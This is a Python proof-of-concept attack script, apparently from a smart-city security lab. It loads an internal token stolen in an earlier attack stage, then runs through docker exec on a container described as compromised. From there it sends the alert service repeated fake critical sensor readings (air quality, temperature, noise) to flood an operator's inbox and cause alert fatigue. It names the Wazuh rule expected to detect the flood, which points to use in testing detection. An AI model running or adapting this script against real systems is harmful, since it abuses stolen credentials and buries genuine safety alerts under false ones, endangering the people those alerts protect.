#!/usr/bin/env python3
"""
Threat 3 PoC: Email flood / alert fatigue — using the token stolen in Threat 2.

Attack chain (continues from apt_attack.py):
  1. Reads the internal_token extracted by apt_attack.py from /tmp/sc_extracted_token.txt
  2. Calls alert-service /check with fabricated critical sensor readings (AQI=487, Temp=89°C)
  3. Alert-service calls send_email() for each request → logs event_type: email_sent
  4. Wazuh rule 100301 fires (10+ email_sent in 60s)
  5. Emails go through Postfix → SpamAssassin scores ALL_CAPS subjects → mailbox floods
  6. Operator experiences alert fatigue — real alerts buried under spam

This runs from the Debian VM via docker exec (the token gives us access to the internal
Docker network where alert-service listens on port 5500 without external exposure).

Usage:
    # After running apt_attack.py:
    python3 poc/spam_attack.py [--count 30] [--interval 0.5]

    # Or supply the token manually:
    python3 poc/spam_attack.py --token <token> [--count 30]
"""
import argparse
import json
import subprocess
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

TOKEN_FILE = "/tmp/sc_extracted_token.txt"
ALERT_SERVICE_INTERNAL = "http://alert-service:5500"


def _incus_ip(container="smartcity-services"):
    try:
        out = subprocess.check_output(
            ["incus", "list", container, "-f", "csv", "-c", "4"],
            stderr=subprocess.DEVNULL, text=True,
        ).strip()
        return out.splitlines()[0].split()[0]
    except Exception:
        return None


def _load_token(path=TOKEN_FILE):
    try:
        with open(path) as f:
            return f.read().strip()
    except FileNotFoundError:
        return None


parser = argparse.ArgumentParser(description="Spam PoC — alert flood via stolen token")
parser.add_argument("--token", default=None, help="Internal token (default: read from apt_attack output)")
parser.add_argument("--count", type=int, default=30, help="Number of fake alerts to inject")
parser.add_argument("--interval", type=float, default=0.5, help="Delay between requests (seconds)")
args = parser.parse_args()

token = args.token or _load_token()
if not token:
    print(f"[!] No token found. Run apt_attack.py first, or pass --token <value>")
    raise SystemExit(1)

print(f"[*] Spam PoC — using extracted token: {token[:12]}...")
print(f"[*] Injecting {args.count} fake critical readings into alert-service")
print(f"[*] Detection: Wazuh rule 100301 (10+ email_sent in 60s)")
print(f"[*] Running via docker exec on zone-aggregator-north (compromised node)")
print()

# Build the Python one-liner that runs inside zone-aggregator-north container.
# The compromised container can reach alert-service by its Docker service name.
INNER_SCRIPT = f"""
import json, time, urllib.request, urllib.error
from datetime import datetime, timezone

token = {repr(token)}
count = {args.count}
interval = {args.interval}
url = "{ALERT_SERVICE_INTERNAL}/check"

ZONES = ["north", "center", "south"]
sent = 0
failed = 0

for i in range(count):
    zone = ZONES[i % len(ZONES)]
    payload = json.dumps({{
        "zone": zone,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "aggregated": {{
            "aqi":           {{"avg": 487.0, "min": 480.0, "max": 495.0}},
            "temperature_c": {{"avg": 89.3,  "min": 85.0,  "max": 92.0}},
            "noise_db":      {{"avg": 142.0, "min": 138.0, "max": 145.0}}
        }}
    }}).encode()
    req = urllib.request.Request(
        url, data=payload,
        headers={{"x-internal-token": token, "Content-Type": "application/json"}},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            sent += 1
        if sent % 5 == 0:
            print(f"[{{datetime.now().strftime('%H:%M:%S')}}] Injected {{sent}}/{{count}} fake alerts")
    except Exception as e:
        failed += 1
        if failed <= 3:
            print(f"[!] Request {{i+1}} failed: {{e}}")
    time.sleep(interval)

print(f"\\n[+] Done. Injected={{sent}} Failed={{failed}}")
print(f"[+] Wazuh:      rule 100301 (email flood detected)")
print(f"[+] Prometheus: alert_emails_total and wazuh_alerts_total{{rule_id=\\"100301\\"}}")
print(f"[+] Ops portal: check Inbox — operator mailbox should be flooded")
"""

incus_ip = _incus_ip()
if not incus_ip:
    print("[!] Could not detect Incus container IP — is the VM running?")
    raise SystemExit(1)

print(f"[*] Sending attack via zone-aggregator-north (simulating compromised node)...")
print()

cmd = [
    "incus", "exec", "smartcity-services", "--",
    "docker", "exec", "zone-aggregator-north",
    "python3", "-c", INNER_SCRIPT,
]

try:
    subprocess.run(cmd, check=True)
except subprocess.CalledProcessError as e:
    print(f"[!] Execution failed: {e}")
    raise SystemExit(1)
